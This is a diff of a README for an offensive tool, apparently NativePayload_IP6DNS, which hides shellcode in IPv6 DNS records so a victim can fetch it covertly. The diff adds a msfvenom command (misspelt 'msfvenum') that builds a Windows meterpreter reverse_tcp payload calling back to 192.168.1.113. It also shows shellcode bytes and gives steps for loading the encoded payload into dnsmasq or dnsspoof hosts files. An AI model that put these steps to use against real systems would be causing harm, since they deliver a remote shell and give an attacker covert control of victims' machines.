@@ -11,14 +11,18 @@ note : {fe80:1111:}{fc48:83e4:f0e8:cc00:0000}{:ae0} {test.domain.com}
 note : 10 bytes Payload ==> {fc48:83e4:f0e8:cc00:0000} and {:ae0} is payload counter or ID 
 
 
+Example: msfvenum --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.113 -f c > /payload_string.txt
+
+Replace your Payload_strings.txt file  from "\0xfc\0x48\0x83..." to "fc4883..."
+
 syntax 1 : NativePayload_IP6DNS.exe null "payload string"
 
-description 1 : Making Hosts files for Linux Dns Server Like Dnsmasq or dnsspoof tools , copy output for this command to DNS Hosts file in linux
+Description 1 : Making Hosts files for Linux Dns Server Like Dnsmasq or dnsspoof tools , copy output for this command to DNS Hosts file in linux
 you can use Msfvenom tool like example and copy your payload in "payload string"
 
 Example : payload string ==> fc4883e4f0e8cc000000415141505251564831d2ae1
 
-Example: msfvenum --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.113 -f c > /dnsmasq.hosts
+Example: NativePayload_IP6DNS.exe null "payload string" > /dnsmasq.hosts
 
 after this command you have something like these lines in your Hosts file :
 
